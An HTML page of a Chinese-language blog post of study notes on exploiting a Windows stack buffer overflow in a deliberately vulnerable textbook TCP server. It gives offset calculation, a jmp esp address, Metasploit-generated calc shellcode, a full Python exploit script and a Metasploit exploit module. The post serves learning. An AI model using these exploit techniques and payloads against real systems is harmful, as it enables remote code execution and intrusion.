@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>栈溢出学习 | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。
+基础概念1.每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：
+
+ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。
+EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出学习">
+<meta property="og:url" content="http://sh3ll.me/2014/12/06/stack-overflow/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。
+基础概念1.每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：
+
+ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。
+EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的">
+<meta property="og:image" content="http://sh3ll.me/images/2014/12/06/stack-overflow-1.png">
+<meta property="og:image" content="http://sh3ll.me/images/2014/12/06/stack-overflow-2.png">
+<meta property="og:image" content="http://sh3ll.me/images/2014/12/06/stack-overflow-3.png">
+<meta property="og:image" content="http://sh3ll.me/images/2014/12/06/stack-overflow-4.png">
+<meta property="og:image" content="http://sh3ll.me/images/2014/12/06/stack-overflow-5.png">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈溢出学习">
+<meta name="twitter:description" content="暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。
+基础概念1.每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：
+
+ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。
+EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的">
+<meta name="twitter:image" content="http://sh3ll.me/images/2014/12/06/stack-overflow-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-stack-overflow" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      栈溢出学习
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2014-12-05T17:00:15.000Z" itemprop="datePublished">12-06-2014</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>暑假实习时和糖果师傅学习了栈溢出，扔了半年，前几天捡起来再次学习一番，纪录笔记如下。</p>
+<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>1.每一个函数独占自己的栈帧空间。当前正在运行的函数的栈帧总是在栈顶。Win32 系统提供两个特殊的寄存器用于标识位于系统栈顶端的栈帧：</p>
+<ul>
+<li>ESP：栈指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
+<li>EBP：基址指针寄存器，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。<a id="more"></a></li>
+</ul>
+<p>2.在函数栈帧中，一般包含以下几类重要信息：</p>
+<ul>
+<li>局部变量：为函数局部变量开辟的内存空间。</li>
+<li>栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。</li>
+<li>函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用钱的代码区中继续执行命令。</li>
+<li>EIP：指令寄存器，其内存放着一个指针，该指针永远指向下一条等待执行的指令地址。可以说如果控制了 EIP 寄存器的内容，就控制了进程 —— 我们让 EIP 指向哪里，CPU 就会去执行哪里的指令。</li>
+</ul>
+<p>3.函数调用大致包括以下几个步骤。</p>
+<ul>
+<li>参数入栈：将参数从右向左依次压入系统栈中。</li>
+<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行。</li>
+<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。</li>
+<li>栈帧调整：具体包括：<ul>
+<li>保存当前栈帧状态值，以备后面恢复本栈帧时使用（EBP入栈）</li>
+<li>将当前栈帧切换到新栈帧（将ESP 值装入 EBP，更新栈帧底部）</li>
+<li>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）</li>
+</ul>
+</li>
+</ul>
+<p>4.按照函数调用约定组织起来的系统栈结构如下：<br><img src="/images/2014/12/06/stack-overflow-1.png" alt="图 1"></p>
+<p>5.一般情况下，ESP 寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP 所指的位置恰好时我们所淹没的返回地址的下一个位置（因为 ESP 永远指向系统栈最上面一个栈帧的栈顶）。</p>
+<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><p>测试的漏洞为《0day 安全 软件漏洞分析技术》一书中第 4 章提供的 TCP Server，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">#include &lt;iostream.h&gt;</div><div class="line">#include &lt;winsock2.h&gt;</div><div class="line">#pragma comment(lib, &quot;ws2_32.lib&quot;)</div><div class="line"></div><div class="line">void msg_display(char * buf)</div><div class="line">&#123;</div><div class="line">    char msg[200];</div><div class="line">    strcpy(msg, buf); //overflow</div><div class="line">    cout &lt;&lt; &quot;************************************************&quot; &lt;&lt; endl;</div><div class="line">    cout &lt;&lt; &quot;received:&quot; &lt;&lt;endl;</div><div class="line">    cout &lt;&lt; msg &lt;&lt; endl;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void main()</div><div class="line">&#123;</div><div class="line">    int sock, msgsock, lenth, receive_len;</div><div class="line">    struct sockaddr_in sock_server, sock_client;</div><div class="line">    char buf[0x200];</div><div class="line"></div><div class="line">    WSADATA wsa;</div><div class="line">    WSAStartup(MAKEWORD(1, 1), &amp;wsa);</div><div class="line">    if ((sock=socket(AF_INET, SOCK_STREAM, 0))&lt;0)</div><div class="line">    &#123;</div><div class="line">        cout &lt;&lt; sock &lt;&lt; &quot;sock creating error!&quot; &lt;&lt; endl;</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line">    sock_server.sin_family = AF_INET;</div><div class="line">    sock_server.sin_port = htons(7777);</div><div class="line">    sock_server.sin_addr.s_addr = htonl(INADDR_ANY);</div><div class="line">    if (bind(sock, (struct sockaddr*)&amp;sock_server, sizeof(sock_server)))</div><div class="line">    &#123;</div><div class="line">        cout &lt;&lt; &quot;binging stream socket error!&quot; &lt;&lt; endl;</div><div class="line">    &#125;</div><div class="line">    cout &lt;&lt; &quot;************************************************&quot; &lt;&lt; endl;</div><div class="line">    cout &lt;&lt; &quot;           exploit target server 1.0            &quot; &lt;&lt; endl;</div><div class="line">    cout &lt;&lt; &quot;************************************************&quot; &lt;&lt; endl;</div><div class="line">    listen(sock, 4);</div><div class="line">    lenth = sizeof(struct sockaddr);</div><div class="line">    do &#123;</div><div class="line">        msgsock = accept(sock, (struct sockaddr*)&amp;sock_client, (int*)&amp;lenth);</div><div class="line">        if (msgsock == -1)</div><div class="line">        &#123;</div><div class="line">            cout &lt;&lt; &quot;aaccept error!&quot; &lt;&lt; endl;</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">            do</div><div class="line">            &#123;</div><div class="line">                memset(buf, 0, sizeof(buf));</div><div class="line">                if ((receive_len = recv(msgsock, buf, sizeof(buf), 0))&lt;0)</div><div class="line">                &#123;</div><div class="line">                    cout &lt;&lt; &quot;reading stream message erro!&quot; &lt;&lt; endl;</div><div class="line">                    receive_len = 0;</div><div class="line">                &#125;</div><div class="line">                msg_display(buf);</div><div class="line">            &#125; while (receive_len);</div><div class="line">            closesocket(msgsock);</div><div class="line">    &#125; while (1);</div><div class="line">    WSACleanup();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="计算溢出长度"><a href="#计算溢出长度" class="headerlink" title="计算溢出长度"></a>计算溢出长度</h2><p>使用 metasploit tools 中的<code>pattern_create.rb</code> 与 <code>pattern_offset.rb</code> 计算溢出长度。<br>首先生成一个长度为 500 的模版字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@sh3ll-me:/opt/metasploit-framework/tools(master○) # ./pattern_create.rb 500</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</div></pre></td></tr></table></figure></p>
+<p>发送模版字符串到 TCP Server 后，程序崩溃，纪录其崩溃地址：<br><img src="/images/2014/12/06/stack-overflow-2.png" alt="图 2"><br>计算其偏移：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@sh3ll-me:/opt/metasploit-framework/tools(master○) # ./pattern_offset.rb 0x37674136</div><div class="line">[*] Exact match at offset 200</div></pre></td></tr></table></figure></p>
+<h2 id="Exploit-It"><a href="#Exploit-It" class="headerlink" title="Exploit It!"></a>Exploit It!</h2><p>根据栈结构，可以构造如下的溢出字符串：</p>
+<blockquote>
+<p>buf(200) + ret(4) + shellcode</p>
+</blockquote>
+<p>其中返回地址 ret 用 <code>jmp esp</code> 的地址覆盖。</p>
+<h4 id="查找-jmp-esp-地址"><a href="#查找-jmp-esp-地址" class="headerlink" title="查找 jmp esp 地址"></a>查找 <code>jmp esp</code> 地址</h4><p>运行 TCP Server，通过 LoadPE 可以查看出其所加载的所有 dll：<br><img src="/images/2014/12/06/stack-overflow-3.png" alt="图 3"><br>这里我在 <code>kernel32.dll</code> 中查找 <code>jmp esp</code> 地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@sh3ll-me:/opt/metasploit-framework(master○) # ./msfpescan -j esp /tmp/kernel32.dll </div><div class="line"></div><div class="line">[/tmp/kernel32.dll]</div><div class="line">0x7c86467b jmp esp</div><div class="line">0x7c903015 push esp; retn 0x0353</div></pre></td></tr></table></figure></p>
+<h4 id="Metasploit-生成-shellcode"><a href="#Metasploit-生成-shellcode" class="headerlink" title="Metasploit 生成 shellcode"></a>Metasploit 生成 shellcode</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">msf &gt; use payload/windows/exec </div><div class="line">msf payload(exec) &gt; set cmd calc</div><div class="line">cmd =&gt; calc</div><div class="line">msf payload(exec) &gt; generate -b \x00\x03 -t python</div><div class="line"># windows/exec - 213 bytes</div><div class="line"># http://www.metasploit.com</div><div class="line"># Encoder: x86/countdown</div><div class="line"># VERBOSE=false, PrependMigrate=false, EXITFUNC=process, </div><div class="line"># CMD=calc</div><div class="line">buf =  &quot;&quot;</div><div class="line">buf += &quot;\x33\xc9\xb1\xc3\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c&quot;</div><div class="line">buf += &quot;\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec&quot;</div><div class="line">buf += &quot;\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d&quot;</div><div class="line">buf += &quot;\x65\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42&quot;</div><div class="line">buf += &quot;\x58\x27\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67&quot;</div><div class="line">buf += &quot;\xba\x60\x23\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd&quot;</div><div class="line">buf += &quot;\x4a\x75\x41\x91\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99&quot;</div><div class="line">buf += &quot;\xa8\x70\x04\xc5\x7b\xdb\x50\x84\x62\xab\x64\x96\xfb&quot;</div><div class="line">buf += &quot;\x99\x96\x57\x5a\x9b\x65\xbe\x2a\x94\x62\x1f\x9b\x5f&quot;</div><div class="line">buf += &quot;\x18\x42\x12\x8a\x31\xe1\x33\x48\x6c\xbd\x09\xfb\x7d&quot;</div><div class="line">buf += &quot;\x39\xf8\x2c\x69\x77\xa4\xf3\x7d\xf1\x7a\xac\xf4\x3a&quot;</div><div class="line">buf += &quot;\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78\x68\xd1\xd5\xd1&quot;</div><div class="line">buf += &quot;\x07\x9f\x65\x09\xcd\xfb\x93\x1e\x11\x2c\x96\x97\x98&quot;</div><div class="line">buf += &quot;\xc9\xf2\xaa\x17\xf2\x19\x60\x75\x1a\x08\x66\x46\xf8&quot;</div><div class="line">buf += &quot;\xce\x01\x3d\x14\x37\x54\x79\x91\xa8\xd3\xba\x31\x49&quot;</div><div class="line">buf += &quot;\x53\xc1\xb0\x0d\xf0\xab\xcb\xd5\xd1\xbc\xee\x41\x6a&quot;</div><div class="line">buf += &quot;\xa3\xa0\xae\xa0\xc4&quot;</div></pre></td></tr></table></figure>
+<p>注：<code>\x00\x03</code> 为坏字符，应过滤。</p>
+<h4 id="构建溢出脚本"><a href="#构建溢出脚本" class="headerlink" title="构建溢出脚本"></a>构建溢出脚本</h4><p>将 buf、ret、shellcode进行拼接，发送给服务器：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">from socket import *</div><div class="line"></div><div class="line">host = &quot;192.168.17.136&quot;</div><div class="line">port = 7777</div><div class="line"></div><div class="line">buf = &quot;\x90&quot; * 200</div><div class="line">ret = &quot;\x7B\x46\x86\x7C&quot;</div><div class="line">shellcode =  &quot;&quot;</div><div class="line">shellcode += &quot;\x33\xc9\xb1\xc3\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c&quot;</div><div class="line">shellcode += &quot;\x0e\x07\xe2\xfa\xfd\xea\x8a\x04\x05\x06\x67\x81\xec&quot;</div><div class="line">shellcode += &quot;\x3b\xd9\x68\x86\x5c\x3f\x9b\x43\x1e\x98\x46\x01\x9d&quot;</div><div class="line">shellcode += &quot;\x65\x30\x16\xad\x51\x3a\x2c\xe1\x2e\xe0\x8d\x1e\x42&quot;</div><div class="line">shellcode += &quot;\x58\x27\x0a\x07\xe9\xe6\x27\x2a\xeb\xcf\xde\x7d\x67&quot;</div><div class="line">shellcode += &quot;\xba\x60\x23\xbf\x77\x0a\x36\xe8\xb2\x7a\x43\xb9\xfd&quot;</div><div class="line">shellcode += &quot;\x4a\x75\x41\x91\x12\xc8\x0c\x5d\xcd\x1f\x68\x48\x99&quot;</div><div class="line">shellcode += &quot;\xa8\x70\x04\xc5\x7b\xdb\x50\x84\x62\xab\x64\x96\xfb&quot;</div><div class="line">shellcode += &quot;\x99\x96\x57\x5a\x9b\x65\xbe\x2a\x94\x62\x1f\x9b\x5f&quot;</div><div class="line">shellcode += &quot;\x18\x42\x12\x8a\x31\xe1\x33\x48\x6c\xbd\x09\xfb\x7d&quot;</div><div class="line">shellcode += &quot;\x39\xf8\x2c\x69\x77\xa4\xf3\x7d\xf1\x7a\xac\xf4\x3a&quot;</div><div class="line">shellcode += &quot;\x5b\xa4\xda\xd9\xe2\xdd\xdf\xd7\x78\x68\xd1\xd5\xd1&quot;</div><div class="line">shellcode += &quot;\x07\x9f\x65\x09\xcd\xfb\x93\x1e\x11\x2c\x96\x97\x98&quot;</div><div class="line">shellcode += &quot;\xc9\xf2\xaa\x17\xf2\x19\x60\x75\x1a\x08\x66\x46\xf8&quot;</div><div class="line">shellcode += &quot;\xce\x01\x3d\x14\x37\x54\x79\x91\xa8\xd3\xba\x31\x49&quot;</div><div class="line">shellcode += &quot;\x53\xc1\xb0\x0d\xf0\xab\xcb\xd5\xd1\xbc\xee\x41\x6a&quot;</div><div class="line">shellcode += &quot;\xa3\xa0\xae\xa0\xc4&quot;</div><div class="line"></div><div class="line">sock = socket(AF_INET, SOCK_STREAM)</div><div class="line">sock.connect((host, port))</div><div class="line">sock.send(buf+ret+shellcode)</div><div class="line">sock.close()</div></pre></td></tr></table></figure></p>
+<p>执行后，成功弹出计算器，shellcode 已运行！<br><img src="/images/2014/12/06/stack-overflow-4.png" alt="图 4"></p>
+<h2 id="编写-Metasploit-模块"><a href="#编写-Metasploit-模块" class="headerlink" title="编写 Metasploit 模块"></a>编写 Metasploit 模块</h2><p>MSF 的框架化使得 exploit 的开发更加简单方便：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">require &apos;msf/core&apos;</div><div class="line"></div><div class="line">class Metasploit3 &lt; Msf::Exploit::Remote</div><div class="line">    include Exploit::Remote::Tcp</div><div class="line">    def initialize(info = &#123;&#125;)</div><div class="line">        super(update_info(</div><div class="line">            info,</div><div class="line">            &apos;Name&apos;          =&gt; &apos;test&apos;,</div><div class="line">            &apos;Version&apos;       =&gt; &apos;1.0&apos;,</div><div class="line">            &apos;Platform&apos;      =&gt; &apos;win&apos;,</div><div class="line">            &apos;Privileged&apos;    =&gt; true,</div><div class="line">            &apos;License&apos;       =&gt; MSF_LICENSE,</div><div class="line">            &apos;Author&apos;        =&gt; &apos;Chu&apos;,</div><div class="line">            &apos;Targets&apos;       =&gt; [</div><div class="line">                [&apos;Windows XP SP3&apos;, &#123;&apos;Ret&apos; =&gt; 0x7C86467B &#125;]</div><div class="line">            ],</div><div class="line">            &apos;DefaultTarget&apos; =&gt; 0,</div><div class="line">            &apos;Payload&apos;       =&gt; &#123;</div><div class="line">                &apos;Space&apos;     =&gt; 300,</div><div class="line">                &apos;BadChars&apos;  =&gt; &quot;\x00&quot;,</div><div class="line">            &#125;</div><div class="line">        ))</div><div class="line">    end</div><div class="line">    def exploit</div><div class="line">        connect</div><div class="line">        print_status(&quot;Sending #&#123;payload.encoded.length&#125; byte payload...&quot;)</div><div class="line">        attack_buf = &apos;a&apos;*200 + [target[&apos;Ret&apos;]].pack(&apos;V&apos;) + payload.encoded</div><div class="line">        sock.put(attack_buf)</div><div class="line">        handler</div><div class="line">        disconnect</div><div class="line">    end</div><div class="line">end</div></pre></td></tr></table></figure></p>
+<p><img src="/images/2014/12/06/stack-overflow-5.png" alt="图 5"></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>《0day 安全 软件漏洞分析技术》</p>
+<p>感谢@糖果牛。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2014/12/06/stack-overflow/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/02/12/php-weak-typing/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          PHP 弱类型带来的安全问题
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/08/13/python-with-yield/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Python with &amp; yield</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2014/12/06/stack-overflow/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
